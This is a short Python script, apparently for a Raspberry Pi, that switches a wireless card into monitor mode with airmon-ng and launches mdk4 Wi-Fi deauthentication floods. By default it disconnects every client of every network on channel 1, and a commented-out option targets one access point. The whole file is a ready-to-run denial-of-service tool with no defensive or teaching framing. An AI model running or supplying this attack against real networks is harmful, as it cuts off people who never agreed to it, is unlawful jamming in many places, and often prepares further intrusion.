import os 
import sys
import time
import json

def is_root():
    return os.geteuid() == 0

def turn_on_monitor_mode(interface):
    try:
        os.system(f'airmon-ng start {interface}')
    except Exception as e:
        print(f"Error turning on monitor mode: {e}")

# not needed currently (raspberry pi monitor mode persists after use)
def turn_off_monitor_mode(interface):
    try:
        os.system(f'airmon-ng stop {interface}mon')
    except Exception as e:
        print(f"Error turning off monitor mode: {e}")

def deauth(interface, target_bssid, count=10):
    try:
        os.system(f'mdk4 {interface}mon d -b {target_bssid} -c 1 -n {count}')
    except Exception as e:
        print(f"Error during deauthentication: {e}")
def deauth_all(interface, count=10):
    try:
        os.system(f'mdk4 {interface}mon d -c 1 -n {count}')
    except Exception as e:
        print(f"Error during deauthentication: {e}")

def main():
    if not is_root():
        sys.exit("This script must be run as root. Please use sudo.")
    interface = "wlan0" # Change as needed
    target_bssid = "FF:FF:FF:FF:FF:FF" # Broadcast BSSID for deauth all
    deauth_all(interface, count=20)
    # For specific target deauth
    # deauth(interface, target_bssid, count=20)
if __name__ == "__main__":
    main()